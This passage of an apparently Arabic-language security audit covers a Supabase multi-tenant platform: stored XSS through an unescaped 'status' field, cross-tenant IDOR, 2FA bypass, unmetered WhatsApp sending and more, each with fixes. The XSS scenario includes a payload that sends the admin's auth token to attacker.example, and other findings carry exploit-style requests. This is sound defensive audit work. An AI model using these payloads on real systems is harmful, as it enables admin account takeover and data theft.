**العمود `status` غير مقيَّد** — لا في السياسة ولا بقيد `CHECK` على الجدول (تحقّقت: قيود `site_errors` هي المفتاح الأساسي ومفتاح أجنبي فقط).

وفي لوحة الإدارة:

```js
// admin/errors.html:580
<div class="error-card ${err.status} ${highlight ? 'new-error-highlight' : ''}" id="error-${cardId}">
```

`err.status` يُدرَج **بلا `escapeHtml`** داخل قيمة سمة `class` محدّدة بعلامتَي اقتباس، والناتج يُسنَد عبر `innerHTML`. بقية الحقول (`message`, `page_url`, `stack_trace`, `file_name`, `user_id`) مهروبة بشكل صحيح، و`type` محميّ بقائمة السياسة — فالمنفذ الوحيد هو `status`، وهو مفتوح تمامًا.

**Attack Scenario**
```http
POST /rest/v1/site_errors
apikey: <anon key>

{"type":"js","message":"x","page_url":"https://mad3oom.online/",
 "status":"a\"><img src=x onerror=\"fetch('https://attacker.example/?s='+localStorage.getItem('sb-srnelrdpqkcntbgudyto-auth-token'))\">"}
```
الصف لا يظهر في تبويب «جديد» (لأن الفلتر `.eq('status','new')`)، لكنه يظهر في تبويب **«الكل»** — وأيضًا عبر مسار البث المباشر في `errors.html:653-660` الذي يضيف البطاقة فورًا عندما يكون التبويب الحالي «الكل».

**Evidence (مُثبَت، ورُجِع عنه)** — إدراج بهوية `anon`:
```
test: ANON_SITE_ERRORS_STATUS_INJECTION
status: x"><img src=x onerror=alert(1)>
```

**Potential Impact**
تنفيذ JavaScript داخل جلسة الأدمن على أصل التطبيق ⇒ سرقة `access_token` من `localStorage` ⇒ **استيلاء كامل على حساب الإدارة** ⇒ وصول إلى كل بيانات كل المستأجرين. هذا أعلى مسار تصعيد في المشروع، ونقطة بدايته **مجهول بلا حساب**.

**Recommended Fix**
1. فوري (Frontend): `${escapeHtml(err.status)}` — وأفضل منه قصر الفئة على قائمة بيضاء: `['new','resolved','archived'].includes(err.status) ? err.status : 'unknown'`.
2. قاعدة البيانات: `CHECK (status IN ('new','resolved','archived'))` على الجدول، وإضافة الشرط إلى `WITH CHECK` في سياسة الإدراج.
3. راجع الصفوف القائمة: `select distinct status from site_errors;`

**Priority** — P0.
**Requires** — Frontend + Database.

---

### C-07 — `gemini-proxy`: قراءة عابرة للمستأجرين، منشورة وحيّة

| | |
|---|---|
| **Severity** | Critical |
| **Category** | IDOR · Multi‑tenant Isolation · Repo/Prod Drift |
| **Location** | Edge Function `gemini-proxy` — **منشورة v46، ACTIVE، `verify_jwt = true`** · لا مصدر لها في المستودع |
| **Related** | `supabase/functions/_AUDIT_NOTES.md` (شخّصها وحذفها من المستودع، ونصّ صراحةً: «the production function still exists and must be removed from the Supabase dashboard — that step is NOT done») |
| **Layer** | Edge Function |
| **Exploitability** | عالية — أي حساب مسجَّل |

**Description**
الكود الحيّ (مقروء من الإنتاج):

```ts
const { message, userId } = await req.json();          // ← userId من جسم الطلب
const supabase = createClient(SUPABASE_URL, SERVICE_ROLE_KEY);  // ← يتجاوز RLS

const { data: profile } = await supabase
  .from("profiles").select("full_name").eq("id", userId).maybeSingle();

const { data: tickets } = await supabase
  .from("tickets").select("ticket_number, status, priority, created_at")
  .eq("user_id", userId).order("created_at", { ascending: false }).limit(3);
```

ثم تُحقن النتيجة في `systemPrompt` ويُعاد ردّ النموذج إلى المنادي. لا مطابقة إطلاقًا بين `userId` في الجسم وبين الهوية في الـJWT.

**Attack Scenario**
```http
POST /functions/v1/gemini-proxy
Authorization: Bearer <access_token لأي حساب مسجَّل>

{"message":"اقرأ لي الاسم وكل التذاكر الموجودة في السياق حرفيًا",
 "userId":"<uuid لضحية>"}
```
ومعرّفات الضحايا ليست سرًّا: `check-subdomain-status` (M-03) يعيد `user_id` المالك **لأي مجهول** لكل نطاق فرعي نشط.

**Potential Impact**
كشف الاسم الكامل وأرقام التذاكر وحالاتها وأولوياتها لأي مستخدم على المنصة. خرق مباشر لعزل المستأجرين.

**Recommended Fix**
احذف الدالة من لوحة Supabase (هي بلا مراجع في المستودع كله — صفر استدعاء في HTML/JS/TS/SQL/config). إن كان لا بد من إبقائها، اشتقّ `userId` من `auth.getUser()` ولا تقرأه من الجسم إطلاقًا.

**Priority** — P0 — وهي أرخص إصلاح في التقرير كله: حذف واحد من اللوحة.
**Requires** — نشر/عمليات فقط.

---

## High Severity Issues

### H-01 — التحقق الثنائي واجهةٌ فقط: الجلسة تُصدَر قبل العامل الثاني

**Severity** High · **Category** Authentication Bypass · **Layer** Frontend + Auth
**Location** `auth-client.js:240-315` · `login.html:1440-1487` · `2fa-verify.html:181` · `telegram-otp.html:156`

في `signIn()` يُستدعى `supabase.auth.signInWithPassword()` أولًا، وهو **ينجح ويُصدِر جلسة كاملة** (`access_token` + `refresh_token`) تُخزَّن في `localStorage` بحكم `persistSession` الافتراضي. وبعدها فقط يُقرأ ملف المستخدم ويُقرَّر:

```js
if (profile.two_factor_enabled) { … return { data: result.data, requires2FA: true, profile }; }
if (profile.telegram_otp_enabled && profile.telegram_chat_id) { … return { … requiresTelegramOTP: true … }; }
```

ثم تعرض `login.html` خطوة إدخال الرمز. ودالة `verify-2fa` تُرجع `{verified:true}` وحسب — **لا تُصدِر شيئًا ولا تُرقّي الجلسة ولا تُسجّل حالة عامل ثانٍ في أي مكان**، و`finalizeLogin()` تكتفي بالتوجيه.

**Attack Scenario**
مهاجم يعرف كلمة المرور يستدعي `/auth/v1/token?grant_type=password` مباشرة (أو يفتح شاشة الدخول ويتوقف عند خطوة الرمز)، ثم يستعمل `access_token` الناتج على `/rest/v1/*` و`/rpc/*` و`/functions/v1/*`. لا شيء في أي طبقة خادم يسأل «هل مرّ هذا المستخدم بالعامل الثاني؟».

**Impact** — 2FA لا يضيف حماية فعلية أمام مهاجم يفهم الـAPI؛ وهي حماية معلَن عنها للمستخدم.

**Fix** — العامل الثاني يجب أن يكون شرطًا على **إصدار** الجلسة لا على عرضها. أنظف مسار في Supabase هو MFA المدمج (`supabase.auth.mfa.*`) الذي يرفع `aal` في الـJWT ويمكن اشتراطه في RLS عبر `auth.jwt()->>'aal' = 'aal2'`. البديل الأقل كلفة: بعد `signInWithPassword` اعمل `signOut()` فورًا، وأصدر الجلسة الحقيقية من دالة حافة بعد التحقق من TOTP عبر `generateLink({type:'magiclink'}) + verifyOtp` — وهو نفس النمط المطبَّق بنجاح في `pi-auth`.

**Priority** P1 · **Requires** Frontend + Edge Function (+ Database إن اشتُرط `aal2` في RLS)

---

### H-02 — `verify-otp`: بلا مصادقة وبلا خنق فعّال

**Severity** High · **Category** Authentication · **Layer** Edge Function
**Location** `supabase/functions/verify-otp/index.ts:21-58` (منشورة، `verify_jwt = false`)

ثلاث مشاكل متراكبة:
1. `userId` يأتي من جسم الطلب بلا أي JWT — أي أن أي شخص يستطيع محاولة التحقق نيابةً عن أي مستخدم.
2. فحص `if (otpData.attempts >= 5)` يقع **بعد** نجاح مطابقة الهاش، فهو لا يخنق التخمين الخاطئ أبدًا. والمحاولات الفاشلة تمرّ على `increment_otp_attempts` وحدها، وهي تزيد العداد ولا يقرأه أحد في المسار الفاشل.
3. لا حدّ على مستوى IP ولا على مستوى الدالة.

**Attack Scenario** — تخمين متوازٍ على فضاء 10⁶ رمزًا خلال نافذة الصلاحية، بلا حظر.
**Impact** — تجاوز طبقة OTP لتيليجرام. الأثر العملي محدود بـH-01 (الجلسة صادرة أصلًا)، لكن الخلل مستقل ويجب إغلاقه مع H-01.

**Fix** — انقل فحص المحاولات قبل المطابقة واجعله يعتمد على عدّاد لكل `user_id` لا على الصف المطابق؛ أضف حدًّا لكل IP؛ واشترط JWT صالحًا (الـ`userId` من الجلسة لا من الجسم).
**Priority** P1 · **Requires** Edge Function + Database

---

### H-03 — إرسال WhatsApp بلا فحص رصيد وبلا خصم، وبتوكن المنصة

**Severity** High · **Category** Business Logic · Billing · Cost
**Location** `supabase/functions/send-whatsapp/_shared/whatsapp-service.ts:28-33, 96-120` · `supabase/functions/mcp/index.ts:178-185`

```ts
export function getWhatsAppAccessToken(integration: WhatsAppIntegration): string {
  const token = Deno.env.get("WHATSAPP_TOKEN");
  if (!token) throw new Error("WHATSAPP_TOKEN غير مُهيأ في متغيرات البيئة");
  return token;
  // TODO: return integration.access_token; (بعد توحيد مسارات الإرسال)
}
```

و`sendTextMessage` / `sendTemplateMessage` في هذا المسار **لا تستدعيان `wa_wallet_check_sufficient` ولا `wa_wallet_charge_message` إطلاقًا**، ولا يوجد أي محفّز على جدول `messages` يخصم (المحفّز الوحيد عليه هو `trg_preview_read_only`).

**للمقارنة:** الدالة المنشورة `integrations-api` تفعل ذلك بشكل صحيح تمامًا — تفحص الرصيد قبل النداء الخارجي، وتخصم بعد قبول Meta، عبر نفس الـRPC. أي أن منطق الفوترة موجود ومُتقَن، **لكن مسارين من ثلاثة لا يمرّان به**.

**Attack Scenario**
حامل مفتاح API بنطاق `whatsapp:send` (وهو نطاق ضمن الافتراضيات `DEFAULT_SCOPES`) يرسل بلا حدود عبر `/functions/v1/send-whatsapp` أو أداة `send_whatsapp` في MCP، برصيد صفر، **وعلى حساب Meta الخاص بالمنصة** لأن التوكن المستعمل هو `WHATSAPP_TOKEN` من بيئة المنصة لا توكن المستأجر. وبالجمع مع C-03 يستطيع أي حساب يملك مفتاحًا أن يمنح نفسه هذا النطاق.

**Impact** — خسارة مالية مباشرة وغير محدودة؛ انعدام قياس الاستهلاك؛ وخلط مسؤولية الإرسال (سمعة رقم WABA الخاص بالمنصة تتأثر بسلوك المستأجرين).

**Fix** — وحّد كل مسارات الإرسال على `whatsapp-dispatcher` المنشور في `integrations-api`: فحص رصيد قبل، خصم بعد، وتوكن المستأجر المفكوك تشفيره. وأضف فحص استحقاق (`has_feature_access('whatsapp_sender')`) قبل النطاق لا بعده.
**Priority** P1 · **Requires** Edge Functions (+ توحيد معماري)

---

### H-04 — نظام الحظر غير مُنفَّذ في القاعدة

**Severity** High · **Category** Broken Access Control
**Location** `migrations/029_entitlement_and_points_guard.sql:96-131` (§3 **غير مُطبَّق**) · `auth-client.js:50-60` · `assets/js/access-policy.js:135`

الترحيل 029 يوثّق الحالة بنفسه بوضوح: «نظام الحظر **معطَّل بالكامل** — الكتابة تفشل، ولا شيء يُنفِّذ العلم لو كُتب، والمستخدم «المحظور» يدخل ويستعمل كل الخدمات. ميزة عرض لا أكثر». وقد عرّف `is_banned()` **وتركها غير مربوطة بأي سياسة عمدًا**، لأن ربطها قرار منتج.

والتحقق على الإنتاج: `is_banned` **غير موجودة أصلًا**، وبوابة `account_is_active()` (042) لا تشمل الحظر، ولا سياسة واحدة تقرأ `ban_status`.

الفحص الوحيد هو `isUserBanned(profile)` في المتصفح: يمنع إكمال `signIn()` ويعرض لوحة «الحساب موقوف» — **ولا يمنع أي نداء REST/RPC مباشر، ولا يُبطل جلسة قائمة.**

**Attack Scenario** — مستخدم محظور يستعمل `access_token` الحالي (أو يجدّده بـ`refresh_token`) ويتابع كل شيء عبر الـAPI مباشرة.
**Impact** — الحظر إجراء معلَن لا يُنفَّذ. أي إساءة استخدام لا يمكن إيقافها فعليًا.
**Fix** — أضف `not public.is_banned()` إلى بوابة `account_is_active()` القائمة (042)، فتلتقطها فورًا الـ17 جدولًا المحمية بسياسة `gate_account_active` بلا لمس سياسة واحدة. وللإبطال الفوري للجلسة استعمل `auth.users.banned_until` عبر `admin.auth.admin.updateUserById`.
**Priority** P1 · **Requires** Database + Edge Function (زر الحظر في اللوحة)

---

### H-05 — انتحال هوية الكاتب في المنتدى والمجتمع

**Severity** High · **Category** Broken Access Control · Integrity
**Location** سياسات INSERT على `forum_threads`, `forum_replies`, `forum_reports`, `community_posts`, `community_comments`

| الجدول | عمود الكاتب | `WITH CHECK` |
|---|---|---|
| `forum_threads` | `author_id` | `auth.uid() IS NOT NULL` |
| `forum_replies` | `author_id` | `auth.uid() IS NOT NULL` |
| `forum_reports` | `reporter_id` | `auth.uid() IS NOT NULL` |
| `community_posts` | `user_id` | `auth.role() = 'authenticated'` |
| `community_comments` | `user_id` | `auth.role() = 'authenticated'` |

لا واحد منها يربط عمود الكاتب بـ`auth.uid()`. والمحفّز `forum_content_sanitization` — رغم اسمه — لا يفعل إلا `filter_profanity` على `content` و`title`، فلا يلمس الهوية.

**Attack Scenario** — إدراج موضوع أو ردّ أو بلاغ بـ`author_id` لحساب الإدارة، فيظهر في الواجهة باسمه وشارة دوره (`forum.js:473` يعرض `thread.author.role`).
**Impact** — انتحال هوية قابل للتصديق داخل المنصة؛ تشويه سمعة؛ بلاغات مزوّرة تُنسَب لمستخدمين أبرياء؛ وإفساد عدّادات المشاركة والأوسمة (محفّزات `trg_badges_on_forum_*` و`increment_user_post_count` تُمنَح للهوية المزوّرة).
**Fix** — `WITH CHECK (author_id = auth.uid())` في الخمس سياسات (و`reporter_id = auth.uid()` للبلاغات).
**Priority** P1 · **Requires** Database

---

### H-06 — `meta-webhook`: تحقق توقيع يفشل مفتوحًا

**Severity** High · **Category** Webhook Security
**Location** `supabase/functions/meta-webhook/index.ts:32-45` (منشورة، `verify_jwt = false`)

```ts
const appSecret = Deno.env.get("META_APP_SECRET");
if (appSecret) {                       // ← إن لم يكن مضبوطًا، يُتخطّى الفحص كله
  const signature = req.headers.get("x-hub-signature-256");
  if (!signature) return new Response("Missing signature", { status: 401 });
  const expectedSig = "sha256=" + await computeHmac(appSecret, rawBody);
  if (signature !== expectedSig) return new Response("Invalid signature", { status: 401 });
}
```

**Classification** — الخلل في الكود **مؤكَّد**؛ أما هل هو مستغَل الآن فيتوقف على قيمة `META_APP_SECRET` في البيئة، **ولم أتمكن من قراءة متغيرات البيئة** (انظر قسم Areas Not Fully Verified).

**Impact عند عدم الضبط** — أي شخص يستطيع POST رسائل مزوّرة تحدّث `whatsapp_templates` بحالة عشوائية. ولاحظ أن التحديث يقع على `name` عند غياب `meta_template_id` — **بلا أي عمود مالك**، أي يطال قوالب كل المستأجرين الحاملين لنفس الاسم.
**Fix** — اقلب المنطق: `if (!appSecret) return 500` (فشل مغلق)، واستعمل مقارنة ثابتة الزمن، واربط التحديث بمالك محدّد.
**Priority** P1 · **Requires** Edge Function (+ تأكيد البيئة)

---

### H-07 — `huggingface-chatbot`: وكيل LLM عام بلا مصادقة

**Severity** High · **Category** Cost Abuse · DoS
**Location** `supabase/functions/huggingface-chatbot/index.ts` — منشورة، `verify_jwt = false`، وبلا أي فحص هوية داخل الكود

أي شخص على الإنترنت يستطيع POST رسالة فتُمرَّر إلى Hugging Face بمفتاح `HUGGINGFACE_API_KEY` الخاص بالمنصة.

**Impact** — استنزاف حصة/تكلفة المفتاح؛ استعمال المنصة كوكيل LLM مجاني؛ احتمال حظر المفتاح بسبب سوء استخدام طرف ثالث. لا كشف بيانات مستأجرين (الدالة لا تقرأ من القاعدة إطلاقًا).
**Fix** — إما احذفها (تحقّق من المراجع أولًا)، أو اضبط `verify_jwt = true` وأضف حدًّا لكل مستخدم.
**Priority** P1 · **Requires** نشر/إعدادات

---

### H-08 — مفتاح Turnstile السري في ملف يُخدَم للمتصفح

**Severity** High · **Category** Secrets Exposure
**Location** `turnstile-config.js:16`

```js
export const TURNSTILE_CONFIG = {
  SITEKEY: '0x4AAAAAADnzinuKMCVrMqHi',
  SECRET_KEY: '0x4AAAAAA…[REDACTED — تم تدويره/يجب تدويره]',   // ← سرّ
```

والملف نفسه يحذّر في تعليقه الختامي: «الـ Secret Key يجب أن يبقى سريًا ولا يُرسل للعميل».

المشروع يُنشَر على Vercel كملفات ثابتة، فكل ملف في الجذر قابل للجلب مباشرةً على `https://<domain>/turnstile-config.js`. وهو ملف **مُرتكَب في Git**، أي أن السرّ في تاريخ المستودع أيضًا.

**Classification** — تسريب سرّ **مؤكَّد**. لكن الأثر الوظيفي اليوم **محدود**: بحثتُ عن كل مراجع `turnstile-config` و`TURNSTILE_CONFIG` في المشروع — **صفر استيراد**، فالملف كود ميت. ومع ذلك المفتاح مكشوف ويجب اعتباره مخترَقًا.

**Impact** — تزوير التحقق من التحدي (إن استُعمل مستقبلًا)؛ استهلاك حصة حساب Cloudflare.
**Fix** — دوّر المفتاح في Cloudflare فورًا؛ احذف الملف أو أزل السرّ منه؛ وانقل `verifyTurnstileToken` إلى دالة حافة تقرأ السرّ من `Deno.env`. ولأن السرّ في تاريخ Git، التدوير إلزامي ولا يكفي الحذف.
**Priority** P1 · **Requires** أسرار/إعدادات + تنظيف كود

---

### H-09 — انحراف المستودع عن الإنتاج في الاتجاهين

**Severity** High · **Category** Architecture · Process · Supply Chain
**Location** عام

**الاتجاه الأول — المستودع متقدّم على الإنتاج:** ستة ترحيلات أمنية مكتوبة ومختبَرة وغير مُطبَّقة (جدول «حالة تطبيق الترحيلات» أعلاه). وهذه وحدها مصدر C-01 و C-02 و C-04 و H-04.

**الاتجاه الثاني — الإنتاج متقدّم على المستودع:** 19 دالة حافة منشورة ونشطة بلا أي مصدر في `supabase/functions/`:

```
telegram-webhook · whatsapp-webhook · gemini-proxy · exchange-token
manage-subdomain · subdomain-auth-check · inbound-email-webhook
resend-inbound-webhook · register-whatsapp · whatsapp-phone-status
telegram-connect-bot · regenerate-api-token-secret · test-integration-connection
chat-bot-reply · agent-manager · wf-executor · sie-api · integrations-api · aqar-auth
```

من بينها **سبع دوال بـ`verify_jwt = false`** — أي أنها سطح هجوم غير مُراجَع في هذا التقرير ولا في أي مراجعة كود مستقبلية تعتمد على المستودع وحده. وقد فحصتُ منها اثنتين فقط: `gemini-proxy` (⇒ C-07) و`integrations-api` (سليمة معماريًّا).

**لماذا لم يُكتشف هذا:** حزمة `tests/sql/` في `.github/workflows/tests.yml` تنشئ Postgres مؤقتًا وتطبّق عليه ترحيلات **المستودع**. فهي تثبت صحة الترحيل لا نشره. ولا يوجد أي فحص تطابق مع الإنتاج.

**Impact** — إصلاحات أمنية يظنّها الفريق منفَّذة وهي ليست كذلك؛ وكود حيّ لا يمرّ بأي مراجعة.
**Fix**
1. طبّق الترحيلات الستة، بالترتيب، على بيئة اختبار أولًا.
2. أضف خطوة CI تقارن الإنتاج بالمستودع: قائمة الدوال المنشورة مقابل مجلدات `supabase/functions/`، ووجود كائن مرجعي لكل ترحيل (`to_regprocedure`).
3. أنزل مصادر الدوال الـ19 إلى المستودع (`supabase functions download`) أو احذف ما هو ميت منها.
4. تبنَّ `supabase/migrations/` الرسمي بجدول تتبّع بدل مجلد `migrations/` اليدوي.

**Priority** P1 (والإجراء التصحيحي الأهم في التقرير كله) · **Requires** عمليات + CI

---

### H-10 — بقايا «البريد كسلطة»

**Severity** High · **Category** Authorization Design · Domain Coupling
**Location** متعدد

الترحيل 040 أزال البريد من الدوال المركزية الخمس بنجاح — تحقّقتُ من أجسامها على الإنتاج، وكلها نظيفة الآن (`is_admin`, `is_support_user`, `is_platform_staff`, `is_admin_user`, `is_whatsapp_billing_admin`). لكن بقيت مواضع لم يشملها:

| الموضع | الشكل |
|---|---|
| `central_wallet` SELECT/UPDATE | `auth.jwt() ->> 'email' = 'support@mad3oom.online'` |
| `central_wallet_transactions` SELECT/INSERT | نفسه |
| `manage_user_points()` | نفسه |
| `transfer_points_from_central()` | نفسه |
| `integrations` SELECT (سياستان) | `profiles.email = 'support@mad3oom.online'` |
| `bot_api_keys` SELECT | `profiles.email = 'support@mad3oom.online'` |
| `mcp_servers` ALL · `mcp_server_connections` ALL | `profiles.email = 'support@mad3oom.online'` |
| `is_sie_admin()` | `auth.users.email = 'support@mad3oom.online'` |
| `gate_is_exempt_account()` (042) | `profiles.email = 'mahmoud@mad3oom.com'` |
| `supabase/functions/mcp/_shared/actor.ts:3` | `MAIN_ADMIN_EMAILS = ["support@mad3oom.online","info@mad3oom.online"]` → `isMainAdmin` → `isElevated` → رؤية **كل** التذاكر والعملاء في MCP |

**خطران متمايزان:**
1. **أمني.** المواضع التي تقرأ `profiles.email` قابلة للاختطاف بمجرد كتابة العمود — و**العمود مفتوح اليوم** (C-02). المانع الوحيد قيد `profiles_email_unique` وأن الصفّين محجوزان. هذا حظّ لا حاجز، وينهار لو حُذف صف أو غُيِّر عنوانه. (أما `auth.jwt()->>'email'` و`auth.users.email` فآمنان نسبيًّا لأن تغيير البريد يتطلب تأكيدًا على العنوان الجديد.)
2. **تشغيلي.** `docs/DOMAIN-MIGRATION.md` و`docs/MCP-CANONICAL-CUTOVER.md` يوثّقان انتقالًا من `.online` إلى `.com`. في اليوم الذي تتغيّر فيه عناوين الطاقم، **تُقفل المحفظة المركزية وتكامُلات WhatsApp وخوادم MCP في وجه الإدارة**. ولاحظ أن مالك المنصة `mahmoud@mad3oom.com` **لا يستطيع أصلًا اليوم** الوصول إلى `central_wallet`.

**Fix** — استبدل كل موضع بـ`is_admin()` / `has_elevated_authority()` / `is_platform_staff()` حسب النطاق المقصود. وفي `actor.ts` استبدل قائمة البريد بنداء RPC على `is_admin_user(userId)` الموجودة فعلًا. وفي 042 استبدل `gate_is_exempt_account` بـ`is_platform_owner()`.
**Priority** P1/P2 · **Requires** Database + Edge Function

---

## Medium Severity Issues

**M-01 · حد معدل مفاتيح API قابل للتجاوز** — `mcp/_shared/api-auth.ts:74-88`. العدّ يُقرأ من `api_token_usage_logs` بينما الكتابة تقع **بعد** توليد الرد وبنمط fire‑and‑forget بلا `await`؛ وطلبات متزامنة كلها ترى العدّ نفسه؛ و`(count ?? 0)` يجعل فشل الاستعلام **يفتح** لا يغلق. الإصلاح: عدّاد ذرّي في القاعدة (`increment_api_token_usage` الموجودة بالفعل) يُقرأ ويُزاد في نداء واحد قبل تنفيذ الطلب.

**M-02 · تجاوز بوابة طريقة الفوترة** — `wa_set_integration_billing_method()` تشترط `is_whatsapp_billing_admin()`، لكن سياسة `Users can update own integrations` تسمح للمالك بتحديث **أي عمود** بما فيه `metadata`، ومنه `metadata->>'billing_method'` الذي يقرأه `whatsapp-dispatcher` ليقرر الخصم. الإصلاح: محفّز يمنع تغيير `metadata->'billing_method'` من غير مسؤول الفوترة.

**M-03 · كشف `user_id` للمالك لمجهول** — `check-subdomain-status/index.ts:70-77` يعيد `user_id` لكل نطاق فرعي `status='success'` بلا أي مصادقة، والأسماء قابلة للتعداد. UUID ليس اعتمادًا بذاته، لكنه يهدي المهاجم هدفًا صالحًا لثغرات المعاملات (انظر C-07).

**M-04 · كشف البريد من معرّفات عامة** — `get_email_by_username`, `get_email_by_phone`, `resolve_company_member_login` قابلة للتنفيذ من `anon`. الخنق موجود (5 لكل قيمة/10د، و60 عامة/5د) لكنه يسمح بآلاف الاستعلامات يوميًا. مقايضة تجربة‑استخدام مقصودة؛ الأفضل إعادة `true/false` أو تنفيذ الدخول في الخادم بدل إعادة البريد للعميل.

**M-05 · تسميم دلو الحد** — `sie_rate_limit_hit(p_client_ip text)` قابلة للتنفيذ من `anon` وتبني المفتاح من `p_client_ip` الذي يرسله المنادي. مهاجم مجهول يمرّر IP عشوائيًا في كل نداء فيتجاوز الحد تمامًا، أو يمرّر IP ضحية فيستنزف دلوه. الإصلاح: اشتقّ الـIP في الخادم فقط.

**M-06 · سرّ TOTP في المتصفح** — `login.html:1447` يقرأ `_pendingLoginProfile.two_factor_secret` ويرسله في جسم الطلب، أي أن بذرة TOTP تصل إلى JavaScript على الجهاز. النسخة الحالية من `verify-2fa` تتجاهل `tempSecret` عند وجود سرّ مخزَّن (إصلاح صحيح وسابق)، لكن بقاء العمود مقروءًا يعني أن أي XSS يسرق العامل الثاني نفسه. الإصلاح: امنع `two_factor_secret` و`recovery_codes` من `SELECT` عبر منح على مستوى الأعمدة أو view، وتوقّف عن إرسال `tempSecret` من `login.html`.

**M-07 · سباق على المحفظة المركزية** — `transfer_points_from_central` تقرأ `balance` في `SELECT` منفصل ثم تحدّث بـ`balance - amount` بلا `FOR UPDATE`. نداءان متزامنان يمرّان بنفس الفحص فيمكن أن يهبط الرصيد تحت الصفر. مقصور على الطاقم فالأثر محدود، لكنه خلل صحيح. الإصلاح: `SELECT … FOR UPDATE` قبل الفحص. (على النقيض، `wa_wallet_charge_message` مكتوبة بشكل صحيح تمامًا: `FOR UPDATE` ثم الفحص ثم التحديث — **مثال يُحتذى داخل المشروع نفسه**.)

**M-08 · `assertScope` يفشل مفتوحًا** — `integrations-api/core/auth.ts`: `if (ctx.scopes.length === 0) return;` أي أن مفتاحًا بلا نطاقات يحصل على كل شيء. الإصلاح: اجعل «بلا نطاقات» يعني «بلا صلاحيات»، واضبط نطاقًا افتراضيًا صريحًا عند الإنشاء.

**M-09 · سلسلة التوريد في الواجهة** — صفر `integrity=` في كل ملفات HTML (تحقّقتُ: 0 نتيجة). ونسخ غير مثبّتة: `@supabase/supabase-js@2` (major عائم) و`chart.js` (بلا نسخة إطلاقًا). واستيراد كود تطبيق من أصل آخر: `import … from 'https://wa.mad3oom.com/whatsapp-wallet-topup-service.js'`. أي اختراق أو إصدار كاسر في CDN يُنفَّذ بامتياز أصل التطبيق حيث يُخزَّن `access_token`. (**نقطة قوة مقابلة:** وحدات SIE مثبّتة على SHA كامل `@8252e577…` — وهو التصرف الصحيح تمامًا.)

**M-10 · اعتماديات قديمة** — `xlsx@0.18.5` (مثبّت في `package-lock.json` ومحمَّل من CDN): إصدار معروف بثغرة تلوث prototype، والإصلاح في 0.19.3+ (وحزمة `xlsx` على npm مهجورة لصالح توزيع SheetJS الرسمي). كذلك `dompurify@3.1.6` — وهي **الحاجز الوحيد أمام XSS المنتدى** (`forum.js:19-21`) فيجب أن تكون على أحدث إصدار — و`jspdf@2.5.1` و`jspdf-autotable@3.5.28` و`deno.land/std@0.177.0`. **Classification:** ثغرة `xlsx` مؤكَّدة بالنسخة؛ البقية «قديمة، تستحق مراجعة نشرات الأمان» ولم أتحقق من استغلالها في هذا السياق.

**M-11 · `status` غير مقيَّد في طلبات الشحن** — سياسة INSERT على `whatsapp_wallet_topup_requests` تتحقق من `user_id` و`ticket_id` فقط. العميل يقدر يرسل `status:'approved'`. الرصيد لا يُضاف تلقائيًا (الإضافة عبر `wa_wallet_adjust` المقصورة على الطاقم) فلا خسارة مالية مباشرة — لكن اللوحة والتقارير تُضلَّل. الإصلاح: `AND status = 'pending' AND reviewed_by IS NULL AND reviewed_at IS NULL` (نفس نمط `waitlist_entries_anon_insert` المطبَّق بشكل صحيح).

**M-12 · خصم مُبتلَع بعد إرسال ناجح** — `whatsapp-dispatcher.ts`: عند فشل `wa_wallet_charge_message` بعد قبول Meta، يُسجَّل الخطأ ويُعاد النجاح. القرار مبرَّر (العميل استلم الرسالة فعلًا) لكنه بلا آلية تعويض. الإصلاح: صف دَيْن/طابور إعادة محاولة بدل السجل وحده.

**M-13 · أداء RLS** — 180 سياسة تعيد تقييم `auth.uid()`/`current_setting()` **لكل صف**، و261 حالة «سياسات متعددة مسموحة» لنفس الدور والفعل (كل سياسة إضافية تُقيَّم لكل صف). الإصلاح القياسي: `(select auth.uid())` بدل `auth.uid()`، ودمج السياسات المتداخلة.

**M-14 · 108 مفتاح أجنبي بلا فهرس** — يجعل عمليات الحذف والانضمام تمسح الجدول بالكامل. أثره يتفاقم مع النمو.

**M-15 · نسختان متباعدتان من `api-auth.ts`** — نسخة `mcp/` تسجّل `status_code` وتزيد `usage_count` عبر RPC؛ نسخة `send-whatsapp/` لا تفعل ولا واحدة منهما وتوقيعها مختلف (`verifyApiToken(req, endpoint)`). أي أن استخدام مفاتيح API عبر `send-whatsapp` **لا يظهر في عدّاد الاستخدام**. الإصلاح: وحدة مشتركة واحدة.

**M-16 · `pi-auth` لا يتوسّع** — `findUserByEmail` يمرّ على `listUsers` بـ200 لكل صفحة حتى 50 صفحة في **كل** عملية دخول. عند 10,000 مستخدم تتوقف عن إيجاد الحسابات القائمة فتُنشئ حسابات مكرّرة. الإصلاح: استعلام مباشر على `auth.users` بالبريد، أو فهرس على `profiles.pi_uid`.

**M-17 · إدراج مجهول غير محدود في `site_errors`** — 1,429 صفًّا حاليًا، بلا حد معدل وبلا حد حجم فعلي (2000 + 8000 حرفًا لكل صف). يصلح لإغراق التخزين ولإغراق لوحة الإدارة. (وهو أيضًا ناقل C-06.)

**M-18 · دوال ميتة منشورة** — `ai-probe-temp` (ترجع 410 وحسب)، `gemini-proxy` (⇒ C-07)، وازدواج `inbound-email-webhook` / `resend-inbound-webhook` (نفس الوظيفة، واحدة منهما ميتة يقينًا). كل دالة منشورة سطح هجوم وتكلفة صيانة.

**M-19 · بريد عشوائي من عنوان موثَّق** — `send-ticket-email` يقبل `customer_email` و`message` من المنادي ويبنيهما في HTML، والمُرسِل من قائمة `ALLOWED_SENDERS` كلها على نطاق المنصة. الأدمن/الدعم يستطيع إرسال أي رسالة إلى أي عنوان من `support@mad3oom.online`. خطر داخلي (أو خطر استغلال حساب أدمن — انظر C-06). الإصلاح: قوالب ثابتة بمعاملات لا HTML حر، وسجل تدقيق لكل إرسال.

---

## Low Severity Issues

**L-01 · CORS `*`** — كل الدوال تعيد `Access-Control-Allow-Origin: *`. غير خطير بذاته: لا كوكيز ولا `credentials: include`، والمتصفح لا يرفق ترويسة `Authorization` تلقائيًا عبر الأصول. لكن قصر الأصل على نطاقات المنصة يقلّل إساءة الاستخدام من صفحات طرف ثالث.

**L-02 · مقارنات غير ثابتة الزمن** — `signature !== expectedSig` في `meta-webhook`، `secretRow.value === internalSecret` في `send-ticket-email`، `token === SERVICE_ROLE_KEY` في `ai-gateway`. الاستغلال عبر الشبكة غير عملي، لكن الدالة `timingSafeEqual` موجودة فعلًا في `api-auth.ts` — فالاتساق مجاني.

**L-03 · تسريب خطأ المزوّد** — `get-attachment-url/index.ts:83` يعيد نص خطأ Resend للعميل.

